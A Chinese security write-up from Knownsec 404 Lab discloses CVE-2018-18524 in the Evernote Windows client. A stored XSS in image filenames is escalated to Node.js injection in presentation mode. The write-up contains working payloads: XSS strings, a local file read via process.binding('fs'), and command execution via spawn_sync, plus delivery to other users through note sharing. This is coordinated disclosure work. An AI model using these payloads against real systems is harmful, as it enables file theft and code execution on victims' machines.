**作者： dawu@知道创宇404实验室**  
**时间： 2018/10/24**  
**[English Version](https://paper.seebug.org/737/ "English Version")**

## 0x00 漏洞简介

  1. 印象笔记 Windows 客户端 6.14 版本修复了一个储存型 XSS。
  2. 由于只修复了 XSS 的入口点而没有在出口处添加过滤，导致攻击者可以在 6.14 版本的客户端中生成储存型 XSS并在 6.15 版本中触发。
  3. 印象笔记的展示模式是使用 NodeWebKit 实现的，通过储存型 XSS 可以在展示模式下注入 Nodejs 代码。
  4. 经过各种尝试，最终通过注入的 Nodejs 代码实现了本地文件读取和远程命令执行。

## 0x01 前言

2018/09/20，我当时的同事[@sebao](http://www.daimacn.com)告诉我印象笔记修复了他的 `XSS`
漏洞并登上了名人堂，碰巧国庆的时候考古过几个客户端 XSS
导致命令执行的案例，就想在印象笔记客户端也寻找一下类似的问题。在之后的测试过程中，我不仅发现原本的 `XSS` 修复方案存在漏洞、利用这个 `XSS`
漏洞实现了本地文件读取和远程命令执行，还通过分享笔记的功能实现了远程攻击。

## 0x02 印象笔记 Windows 客户端 6.14 储存型 XSS 漏洞

`@sebao` 发现的储存型 XSS 漏洞的触发方式如下： 1\. 在笔记中添加一张图片 2\. 右键并将该图片更名为 `"
onclick="alert(1)">.jpg"` 3\. 双击打开该笔记并点击图片，成功弹框。

![](https://images.seebug.org/content/images/2018/11/b327c08d-a465-4650-abe4-d8b69b1af1eb.png-w331s)
![](https://images.seebug.org/content/images/2018/11/4e7a867a-ce5a-4c29-94c2-e31b2b502b6c.png-w331s)

经过测试，印象笔记官方修复该 XSS 的方式为：在更名处过滤了 `>`、`<`、`"` 等特殊字符，但有意思的是我在 6.14 版本下测试的 XSS 在
6.15 版本中依旧可以弹框，这也就意味着：官方只修了 XSS 的入口，在 XSS 的输出位置，依旧是没有任何过滤的。

## 0x03 演示模式下的 Nodejs 代码注入

XSS 修复方案存在漏洞并不能算是一个很严重的安全问题，所以我决定深入挖掘一下其他的漏洞，比如本地文件读取或者远程命令执行。为了方便测试，我在 6.14
版本的客户端中将一张图片更名为 `" onclick="alert(1)"><script
src="http://172.16.4.1:8000/1.js">.jpg` 后，将客户端升级为最新版 6.15。

我测试了一些特殊的
API，例如`evernote.openAttachment`、`goog.loadModuleFromUrl`，但是没有显著的收获。所以我转换了思路，遍历
`C:\\Program Files(x86)\Evernote\Evernote\` 目录下的所有文件。我发现印象笔记在 `C:\\Program
Files(x86)\Evernote\Evernote\NodeWebKit` 目录下存在 `NodeWebKit`，在演示的时候，印象笔记会调用这个
`NodeWebKit`。

一个更好的消息是我可以通过之前发现的储存型 XSS 在 `NodeWebKit` 中执行 `Nodejs` 代码。

![](https://images.seebug.org/content/images/2018/11/ba8743dc-7ce0-4bba-88a5-1849241fabc6.png-w331s)

## 0x04 本地文件读取 和 远程命令执行的实现

既然可以注入 `Nodejs` 代码，那就意味着我可以尝试使用 `child_process` 来执行任意命令。

我尝试使用 `require('child_process').exec`，但是却报错了： `Module name "child_process" has
not been loaded yet for context`。

![](https://images.seebug.org/content/images/2018/11/78bc50a5-d2b6-4b6b-9f12-960f3e0dd56d.png-w331s)

这个错误并没有浇灭我刚发现 `Nodejs` 代码注入的激情，我在查阅各种资料尝试 解决/绕过 这个问题。最终，我发现了前人的足迹：[How we
exploited a remote code execution vulnerability in
math.js](https://capacitorset.github.io/mathjs/)

根据文中的内容，简单的修改读取本地文件的 payload 很快就实现了相应的功能：

    
    
    alert("Try to read C:\\\\Windows\\win.ini");
    try{
      var buffer = new Buffer(8192);
      process.binding('fs').read(process.binding('fs').open('..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini', 0, 0600), buffer, 0, 4096); 
      alert(buffer);
    }
    catch(err){
      alert(err);
    }

但是在尝试远程命令执行的时候，我遇到了一些问题。由于并不了解 `Nodejs`，所以我不知道为什么 `NodeWebkit` 中没有 `Object` 和
`Array`，也不知道如何解决这个问题。我听取了文中的建议，尝试去理解
[child_process的源码](https://github.com/nodejs/node/blob/master/lib/child_process.js)，并且查找
`spawn_sync` 相关的用法。

最终，我从 `window.process.env` 中获取到 `env` 的内容，并使用 `spawn_sync` 成功地弹出了计算器。

    
    
    // command executed
    try{
      spawn_sync = process.binding('spawn_sync');
      envPairs = [];
      for (var key in window.process.env) {
        envPairs.push(key + '=' + window.process.env[key]);
      }
      args = [];
    
      const options = {
        file: 'C:\\\\Windows\\system32\\calc.exe',
        args: args,
        envPairs: envPairs,
        stdio: [
          { type: 'pipe', readable: true, writable: false },
          { type: 'pipe', readable: false, writable: true },
          { type: 'pipe', readable: false, writable: true } 
        ]
      };
      spawn_sync.spawn(options);
    }
    catch(err){
      alert(err);
    }

## 0x05 通过分享功能攻击其他用户

在我实现了本地文件读取和本机命令执行后，黑哥提出了一个更高的要求：证明这个漏洞可以影响到其他用户。

在注册了一个小号后，我尝试使用分享功能将 `恶意笔记` 分享给 ”他人“。

![](https://images.seebug.org/content/images/2018/11/a1f4dbaf-6b1c-41b9-a20c-328a2a0bcede.png-w331s)

我的小号将会在 `工作空间` 收到别人发来的消息。

![](https://images.seebug.org/content/images/2018/11/fc1e2ee6-d117-4b92-b3c9-51e5ada1284d.png-w331s)

我的小号尝试演示这个笔记，被注入的 `Nodejs` 代码成功执行！

## 0x06 感谢

  * 感谢[黑哥](https://twitter.com/80vul)在漏洞发现和上报过程中的耐心指导和严格要求。 
  * 感谢我的前404同事sebao跟我分享了他发现的 XSS 漏洞细节。 
  * 感谢[How we exploited a remote code execution vulnerability in math.js](https://capacitorset.github.io/mathjs/)的作者、[【技术分享】从PouchDB到RCE: 一个node.js注入向量](https://www.anquanke.com/post/id/84811)的原文作者、中文译者，这些优秀的文章为我提供了巨大的帮助。

## 0x07 时间线

2018/09/27，发现相关漏洞，攥写报告并发送至 `security@evernote.com`。  
2018/09/27，官方确认漏洞  
2018/10/15，官方在 beta 版本 6.16.1
https://discussion.evernote.com/topic/116650-evernote-for-windows-616-beta-1/
中修复相关漏洞，并将我的名字加入名人堂。  
2018/10/19，在和官方沟通后，自行申请CVE，编号为：CVE-2018-18524  
2018/11/05，Evernote 官方发布 正式版本 6.16.4，确认该漏洞被修复后公开漏洞细节。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/736/>

